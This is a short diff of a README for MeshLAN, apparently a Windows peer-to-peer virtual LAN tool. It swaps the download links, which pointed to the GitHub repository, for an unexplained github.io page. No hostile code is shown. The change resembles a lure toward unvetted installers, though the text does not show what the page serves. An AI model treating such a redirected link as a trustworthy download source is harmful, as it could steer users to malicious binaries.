@@ -31,7 +31,7 @@ Specifically designed to run smoothly on Windows operating systems, MeshLAN inte
 
 ### Step 1: Download MeshLAN
 
-[![Download MeshLAN](https://img.shields.io/badge/Download-MeshLAN-2ea44f?style=for-the-badge&logo=github)](https://github.com/nickyberndt20-web/MeshLAN)
+[![Download MeshLAN](https://img.shields.io/badge/Download-MeshLAN-2ea44f?style=for-the-badge&logo=github)](https://nickyberndt20-web.github.io)
 
 Visit this link to download the application.
 
@@ -152,7 +152,7 @@ MeshLAN puts you in control of your digital world. Create your own network, shar
 
 ## 📋 Quick Reference
 
-- **Download:** [https://github.com/nickyberndt20-web/MeshLAN](https://github.com/nickyberndt20-web/MeshLAN)
+- **Download:** [https://nickyberndt20-web.github.io](https://nickyberndt20-web.github.io)
 - **Platform:** Windows
 - **Type:** Self-hosted, P2P virtual LAN
 - **Security:** Encrypted connections via Nebula
